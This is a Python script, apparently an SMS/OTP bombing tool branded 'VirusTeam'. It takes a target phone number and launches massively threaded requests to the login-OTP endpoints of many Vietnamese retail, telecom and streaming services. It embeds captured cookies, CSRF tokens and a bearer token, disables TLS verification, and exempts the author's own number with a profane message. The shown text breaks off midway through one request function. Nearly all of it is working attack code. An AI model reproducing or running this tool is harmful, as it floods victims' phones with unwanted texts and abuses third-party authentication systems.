import json
import os
import urllib3
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import requests
session = requests.Session()
try:
    import random
    import re
    from random import randint

    import pystyle
    import requests
    from colorama import Fore, Style
    from faker import Faker
except ImportError:
    os.system("pip install faker")
    os.system("pip install requests")
    os.system("pip install colorama")
    os.system('pip install requests && pip install bs4 && pip install pystyle')
    print('Vui Lòng Chạy Lại Tool')
def run(sdt_vs):
    for i in range(54):
        threading.submit(globals()[f'VsTeamHttpRequests{i}'], sdt_vs)

sdt_vs = sys.argv[1][:10]

if not re.search(r"^0\d{9}$", sdt_vs):
    print("Số điện thoại không đúng định dạng")
    sys.exit()
if sdt_vs == "0337885300":
    print("Spam Bố Ăn Lồn À ?")
    sys.exit()
threading = ThreadPoolExecutor(max_workers=int(10000000000000000000000000000))
def VsTeamHttpRequests0(sdt_vs):
    VirusTeam_Url = 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode'
    cookies = {
        "TBMCookie_3209819802479625248": "837235001719489658Mp32H5wN7KdS1OPaqJx0N3Lf+as=",
        "___utmvm": "###########",
        "__RequestVerificationToken_L2dhbWUtYXBw0": "ag_B5oUFFXziKAmFOy4fqG2yttmO085tY9LhlmsjhBmpzdvtyA5dDa9DycWHUFZHsIeAMy78mL51B_hCIhCBChn5_181",
        "_gcl_au": "1.1.283575346.1719489660",
        "_pk_ref.7.8f7e": "%5B%22%22%2C%22%22%2C1719489660%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D",
        "_pk_id.7.8f7e": "8f6944ee4aea6954.1719489660.",
        "_pk_ses.7.8f7e": "1",
        "_fbp": "fb.1.1719489660860.836503108795401674",
        "_ce.irv": "new",
        "cebs": "1",
        "_ce.clock_event": "1",
        "_ce.clock_data": "-1492%2C116.111.187.136%2C3%2C4f5414f86c9f1971668f1af5696b61eb%2CChrome%2CVN",
        "DMX_Personal": "%7B%22UID%22%3A%224d2257dccdcd4328c3d315be5a1af2c1770b1192%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D",
        "mwgngxpv": "3",
        ".AspNetCore.Antiforgery.Pr58635MgNE": "CfDJ8AFHr2lS7PNCsmzvEMPceBO5Bon5zfiBMBZAbvmQiMnYdhvkji6TuV1fM91wx7hmKBXdq7v02RGfLvS6ckfLQdgZXGBtCAkWLF1bCHe2OoD76bW485afyELQ8puXr48C961dENl3FN8QOzOharrJlfM",
        "_ga": "GA1.2.162545923.1719489661",
        "_gid": "GA1.2.1506705069.1719489665",
        "_gat": "1",
        "cebsp_": "2",
        "_ga_TZK5WPYMMS": "GS1.2.1719489666.1.0.1719489666.60.0.0",
        "_ga_TLRZMSX5ME": "GS1.1.1719489660.1.1.1719489671.49.0.0",
        "SvID": "beline173|Zn1Uj|Zn1Uf",
        "__zi": "3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJdNgUvRdVJrUHV9dYyTb9LjLwc-RnrqzKrJO.1",
        "_tt_enable_cookie": "1",
        "_ttp": "bAh736mNZFlgjxX-i_UGr01ZOWU",
        "_ce.s": "v~53e23eb1343dfafd67e18e22b3262e162e7565e4~lcw~1719489680305~lva~1719489661309~vpv~0~v11.cs~127806~v11.s~ed1f1140-347c-11ef-b50f-376d37aa6dac~v11.sla~1719489680308~lcw~1719489680309"
    }
    headers = {
        "host": "www.thegioididong.com",
        "connection": "keep-alive",
        "content-length": "234",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://www.thegioididong.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.thegioididong.com/lich-su-mua-hang/dang-nhap",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    payload = {
    "phoneNumber": sdt_vs,
    "isReSend": "false",
    "sendOTPType": "1",
    "__RequestVerificationToken": "CfDJ8AFHr2lS7PNCsmzvEMPceBMU8Z1SuV_JJ3OBFK93wG3MRzQ7Kle82ApQBZ6EEPnibdyMm6YpFeOFTrJiCkPq4Petdv8oSXV-6q7lFFrJaeRkdKP52KMiBENGV63ob1sWd7QNcGBfksxZkj9NSWg3PEc"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests1(sdt_vs):
    VirusTeam_Url = 'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode'
    cookies = {
        "TBMCookie_3209819802479625248": "170329001719490827tgrxb2J/UkuRq4lU4tT7t0PAyhs=",
        "___utmvm": "###########",
        "mwgngxpv": "3",
        ".AspNetCore.Antiforgery.SuBGfRYNAsQ": "CfDJ8LmkDaXB2QlCm0k7EtaCd5T440PPdpOvHbz42ZaB1iPsT2NCudCh_z_iTyZJqzfnTQXyW8gbtAtciwgryTJtzmTfSw-UhVDf-JQ3sivOcMOLbBf1_vxBBdB9usgY9bhp8bvenMXL0vRQwC704GyJ1ug",
        "DMX_Personal": "%7B%22UID%22%3A%227e992d6f50c0026941fc233925712a04db27c324%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D",
        "_gcl_au": "1.1.2055201869.1719490829",
        "_ga": "GA1.1.1443058218.1719490830",
        "_pk_id.8.8977": "6dede78bc6a86f25.1719490830.",
        "_pk_ses.8.8977": "1",
        "_ce.irv": "new",
        "cebs": "1",
        "_ce.s": "v~51cea43e5924a836dd97c84cff499786e0f1ad92~lcw~1719490830784~lva~1719490830784~vpv~0~lcw~1719490830788",
        "SvID": "new2689|Zn1ZF|Zn1ZD",
        "_ga_Y7SWKJEHCE": "GS1.1.1719490829.1.1.1719490833.56.0.0",
        "_fbp": "fb.1.1719490835433.987369644503526071",
        "__zi": "3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXarj2mJI4zkkNLqJ6CypmxPOJGiGtpFxhDpWs.1"
    }
    headers = {
        "host": "www.dienmayxanh.com",
        "connection": "keep-alive",
        "content-length": "234",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://www.dienmayxanh.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    payload = {
    "phoneNumber": sdt_vs,
    "isReSend": "false",
    "sendOTPType": "1",
    "__RequestVerificationToken": "CfDJ8LmkDaXB2QlCm0k7EtaCd5TIIAhR09EVIWI4JdQjT7GAxy25PeFzGqrQs_87FbV7YQxvzOxbF1xj3AJf5EdI6kQSTJHp3zU3TJOjbQUhbyjvoxMRl7PbsGiEp118U9jkpCzG5gl09nWpsTWYX53LDcY"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests2(sdt_vs):
    VirusTeam_Url = 'https://api.dongplus.vn/api/user/send-one-time-password'
    headers = {
        "host": "api.dongplus.vn",
        "content-length": "23",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "ert": "DP:5e91e80428fdbd88a7d9ee0f22cf80ab",
        "accept-language": "vi",
        "sec-ch-ua-mobile": "?0",
        "rt": "2024-06-28T23:25:49+07:00",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "accept": "*/*",
        "origin": "https://dongplus.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://dongplus.vn/user/login",
        "accept-encoding": "gzip, deflate, br, zstd",
        "priority": "u=1, i"
    }
    cookies = {
        "_gid": "GA1.2.240106267.1719591733",
        "_ga": "GA1.2.1634042563.1719591733",
        "_clck": "fy52hd%7C2%7Cfn0%7C0%7C1640",
        "_ga_RRJDDZGPYG": "GS1.1.1719590246.2.1.1719591745.47.0.0",
        "_clsk": "1cg2u8k%7C1719591746684%7C1%7C1%7Cp.clarity.ms%2Fcollect"
    }
    payload = {
    "phone": sdt_vs
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests3(sdt_vs):
    VirusTeam_Url = 'https://vietteltelecom.vn/api/getOTPLoginCommon'
    cookies = {
        "laravel_session": "yKOWZ0THA6PeEJdoMmjoCwL2mlNisLjXPElI1nUH",
        "_fbp": "fb.1.1719534281684.442838623649907476",
        "XSRF-TOKEN": "eyJpdiI6InVDZUo3NDN3VFRpSzk3THJBSWFPaFE9PSIsInZhbHVlIjoic3llWUFcL0NzUjliUVNWNUxtRFQ3dG5lNHAxTkdrNVwvNXpKTXlEVDR3alc4Y3Y0ekJTcjlPT3ZBTk9Fc2RlTm5WIiwibWFjIjoiNWMzNGQxMzc4M2UzZDQ4MjI0MmE2NmJmMjkzNzQ3YzJmYjM3YzQzMDkxZTJjMTdkNjUwZTcxYjI4NGUyYjhjMiJ9",
        "__zi": "3000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NSqtr_JpqH9BtpY9_VgRMKZGEedqi9zPG9K-ZlUyarv0apC.1",
        "_ga_VH8261689Q": "GS1.1.1719534286.1.1.1719534286.60.0.0",
        "_ga": "GA1.2.1566915878.1719534287",
        "_gid": "GA1.2.1610590746.1719534287",
        "_gcl_au": "1.1.1890578307.1719534437"
    }
    headers = {
        "host": "vietteltelecom.vn",
        "connection": "keep-alive",
        "content-length": "102",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "x-xsrf-token": "eyJpdiI6InVDZUo3NDN3VFRpSzk3THJBSWFPaFE9PSIsInZhbHVlIjoic3llWUFcL0NzUjliUVNWNUxtRFQ3dG5lNHAxTkdrNVwvNXpKTXlEVDR3alc4Y3Y0ekJTcjlPT3ZBTk9Fc2RlTm5WIiwibWFjIjoiNWMzNGQxMzc4M2UzZDQ4MjI0MmE2NmJmMjkzNzQ3YzJmYjM3YzQzMDkxZTJjMTdkNjUwZTcxYjI4NGUyYjhjMiJ9",
        "x-csrf-token": "0V5x1EXBFxPwa4HMYNQ1mJTsVwwVbbT15mSQtL2V",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "accept": "application/json, text/plain, */*",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://vietteltelecom.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vietteltelecom.vn/dang-nhap",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    payload = {
        "phone": sdt_vs,
        "typeCode": "DI_DONG",
        "actionCode": "myviettel://login_mobile",
        "type": "otp_login"
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests4(sdt_vs):
    VirusTeam_Url = 'https://vietteltelecom.vn/api/get-otp'
    cookies = {                                                                "laravel_session": "yKOWZ0THA6PeEJdoMmjoCwL2mlNisLjXPElI1nUH",
        "_fbp": "fb.1.1719534281684.442838623649907476",
        "__zi": "3000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NSqtr_JpqH9BtpY9_VgRMKZGEedqi9zPG9K-ZlUyarv0apC.1",
        "_gid": "GA1.2.1610590746.1719534287",                                 "_gcl_au": "1.1.1890578307.1719534437",                                "_ga": "GA1.2.1566915878.1719534287",
        "_gat_UA-58224545-1": "1",
        "_ga_VH8261689Q": "GS1.1.1719534286.1.1.1719534676.60.0.0",
        "XSRF-TOKEN": "eyJpdiI6IjZnSFVxRGZZcExkSGhaMVhyYkZWeEE9PSIsInZhbHVlIjoiZCtzNCtsaFhpN2R4dXVDbmFIZnlOZWxyU2hvSlE0V3hWdHVndlpuUExRdWIwb3B0OG42bGE4OHdSTGJiZ2xuaSIsIm1hYyI6IjVkN2FmMDhkOTNiM2ZlMjE3Y2I3MDIxZDIwODhjODE2ZTY0OWY0NDQ2OWNiNzMzYmQ5MTkyYjJlYzk4MzcwMjcifQ%3D%3D"
    }
    headers = {
        "host": "vietteltelecom.vn",
        "connection": "keep-alive",                                            "content-length": "41",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",                                                  "x-xsrf-token": "eyJpdiI6IjZnSFVxRGZZcExkSGhaMVhyYkZWeEE9PSIsInZhbHVlIjoiZCtzNCtsaFhpN2R4dXVDbmFIZnlOZWxyU2hvSlE0V3hWdHVndlpuUExRdWIwb3B0OG42bGE4OHdSTGJiZ2xuaSIsIm1hYyI6IjVkN2FmMDhkOTNiM2ZlMjE3Y2I3MDIxZDIwODhjODE2ZTY0OWY0NDQ2OWNiNzMzYmQ5MTkyYjJlYzk4MzcwMjcifQ==",                     "x-csrf-token": "0V5x1EXBFxPwa4HMYNQ1mJTsVwwVbbT15mSQtL2V",            "sec-ch-ua-mobile": "?0",                                              "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",                     "content-type": "application/json;charset=UTF-8",                      "accept": "application/json, text/plain, */*",                         "x-requested-with": "XMLHttpRequest",                                  "sec-ch-ua-platform": "\"Android\"",                                   "origin": "https://vietteltelecom.vn",                                 "sec-fetch-site": "same-origin",                                       "sec-fetch-mode": "cors",                                              "sec-fetch-dest": "empty",                                             "referer": "https://vietteltelecom.vn/dang-nhap",                      "accept-encoding": "gzip, deflate, br, zstd",                          "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"                                                             }
    payload = {
        "msisdn": sdt_vs,
        "type": "register"                                                 }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests5(sdt_vs):
    VirusTeam_Url = f'https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn={sdt_vs}&languageCode=vi'
    cookies = {
        
    }
    headers = {
        "host": "apivideo.mocha.com.vn",
        "connection": "keep-alive",
        "content-length": "0",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://video.mocha.com.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://video.mocha.com.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests6(sdt_vs):
    VirusTeam_Url = 'https://api.vieon.vn/backend/user/v2/register'
    headers = {                                                                "host": "api.vieon.vn",
        "content-length": "202",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json, text/plain, */*",                         "content-type": "application/json",                                    "sec-ch-ua-mobile": "?0",                                              "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTk2MzY3NTQsImp0aSI6IjdlZTA3ZjIxYmZiNTAyZjI0YTQ4NjE1ZTI4YmU4ZmYwIiwiYXVkIjoiIiwiaWF0IjoxNzE5NDYzOTU0LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcxOTQ2Mzk1Mywic3ViIjoiYW5vbnltb3VzX2VmZjVjYjI4OTVlYzc0NjUxYzU4ZmYyMDEzMDg3MTQwLTg1MTQwZTQwOGNkMmU5OGNmYTRkZDA4M2VlYjRmOTVmLTE3MTk0NjM5NTQiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZWZmNWNiMjg5NWVjNzQ2NTFjNThmZjIwMTMwODcxNDAtODUxNDBlNDA4Y2QyZTk4Y2ZhNGRkMDgzZWViNGY5NWYtMTcxOTQ2Mzk1NCIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI2LjAuMC4wIFNhZmFyaS81MzcuMzYiLCJkdCI6Im1vYmlsZV93ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IkFuZHJvaWQgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.J3bkFsHuguXW9GlphwkBp72pyHtVqR9giiZU0qIzd6Q",                               "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://vieon.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vieon.vn/auth/?destination=/&page=/",              "accept-encoding": "gzip, deflate, br, zstd",                          "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    payload = {"username": sdt_vs,"country_code":"VN","model":"Android 10","device_id":"eff5cb2895ec74651c58ff2013087140","device_name":"Chrome/126","device_type":"desktop","platform":"mobile_web","ui":"012021"}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
    return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
def VsTeamHttpRequests7(sdt_vs):
    VirusTeam_Url = 'https://m.tv360.vn/public/v1/auth/get-otp-login'
    headers = {
        "host": "m.tv360.vn",
        "connection": "keep-alive",
        "content-length": "23",
        "starttime": "1719463474570",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "tz": "Asia/Saigon",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://m.tv360.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.tv360.vn/login?r=https%3A%2F%2Fm.tv360.vn%2F",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "cookie": "img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Awap_b4235ffa-9d7d-44cb-9808-610db15d8d84.%2BNvyCGaYKuINc7ZRziQ8alCRs5oEKq%2FywIwRqw%2FWvmM; shared-device-id=wap_b4235ffa-9d7d-44cb-9808-610db15d8d84; screen-size=s%3A784x1755.RfMBA3a0sbsth%2Fh8HYNTvVXWwMPjk%2FrvJ5vcRACFkSA; auto-login=s%3A1.E8d5%2BqHvtoRa81DxWMn1MgOyHoaIIEARCHxdA33Dyqw; session-id=s%3A380a3784-5751-46ac-918a-be53efc2d45a.S7ILmkxBplUth91IYUN5viSeYaScuR8k%2FTRtDjbDSwE; _ga=GA1.2.857869812.1719463278; _gid=GA1.2.280462909.1719463278; G_ENABLED_IDPS=google; _ga_D7L53J0JMS=GS1.1.1719463277.1.1.1719463474.60.0.0; _ga_E5YP28Y8EF=GS1.1.1719463277.1.1.1719463474.0.0.0"
    }
    payload = {"msisdn": sdt_vs}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
    return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
def VsTeamHttpRequests8(sdt_vs):
    VirusTeam_Url = 'https://fptshop.com.vn/api-data/loyalty/Login/Verification'
    cookies = {
        "_gid": "GA1.3.1438213224.1719485307",
        "_gat": "1",
        "_sp_ses.d55b": "*",
        "_sp_id.d55b": "6052dabb-02ab-462a-956a-4a924dc2f8f8.1719485307.1.1719485307..635faab5-9fb1-4298-974a-86a45bb90d8d....0",
        "_ga": "GA1.1.1812613069.1719485307",
        "_gcl_au": "1.1.484164887.1719485307",
        "ajs_group_id": "null",
        "fpt_uuid": "%22651eb4a6-bd8d-423d-8ee3-7febdd00eec7%22",
        "_tt_enable_cookie": "1",
        "_ttp": "nl2_lOI7P6AW0eei6buikHZcNkw",
        "__uidac": "01667d437c07935a91559a1cc87f39e3",
        "__admUTMtime": "1719485308",
        "_fbp": "fb.2.1719485308744.932905351801564499",
        "__rtbh.lid": "%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%228WguGRqzNS4rDeD39WwV%22%7D",
        "dtdz": "e55db8a8-2448-57bf-9918-e7c4eed67cce",
        "__adm_upl": "eyJ0aW1lIjoxNzE5NDg1MzE1LCJfdXBsIjpudWxsfQ==",
        "__RC": "64",
        "__R": "3",
        "__uif": "__uid%3A8899731984256019448",
        "__iid": "",
        "__su": "0",
        "log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc": "2bd8db9a-0371-4b08-a283-04a8fc3a963e",
        "_aff_network": "null",
        "__zi": "3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpfs4yLndIPfktKIHB1F9-Wx91F4CKyaQRkE3O.1",
        "_hjSessionUser_731679": "eyJpZCI6IjJkYTJmNGMyLTliMmQtNTg4OC1iNWI1LTNjYjdiYWI5N2RiNyIsImNyZWF0ZWQiOjE3MTk0ODUzMTIxMDIsImV4aXN0aW5nIjpmYWxzZX0=",
        "_hjSession_731679": "eyJpZCI6IjEzOTk3NDA1LTgwMmItNGYyNy1iY2E3LTNhNWMyMjc5ZDZmYyIsImMiOjE3MTk0ODUzMTIxMDksInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=",
        "vMobile": "2",
        "cf_clearance": "AFVmdC4Exs1u07gw6f89jl0LRWvaxamHFqWj2OuaEzo-1719485315-1.0.1.1-ElezkqHSzevi0oVXiRI39EjeP.gPvLJjMZKScHzxUTPng3s9mcGvVK.8A3QGoAlxosXGkLAEviDSRN3k3x7BZQ",
        "_ga_ZR815NQ85K": "GS1.1.1719485307.1.1.1719485322.45.0.0"
    }
    headers = {
        "host": "fptshop.com.vn",
        "content-length": "16",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://fptshop.com.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://fptshop.com.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    payload = {
    "phone": sdt_vs
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests9(sdt_vs):
    VirusTeam_Url = 'https://h5.vivohan.com/api/register/app/sendSms'
    cookies = {
        "JSESSIONID": "9A9D7E5A5D678A1354355143AA67FE44"
    }
    headers = {
        "host": "h5.vivohan.com",
        "connection": "keep-alive",
        "content-length": "335",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "appversion": "5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "screenresolution": "720.2999906539917,1612.4062290787697",
        "w": "720.2999906539917",
        "channel": "",
        "sec-ch-ua-platform": "\"Android\"",
        "system": "android",
        "appcodename": "Mozilla",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "content-language": "vn",
        "accept": "application/json, text/plain, */*",
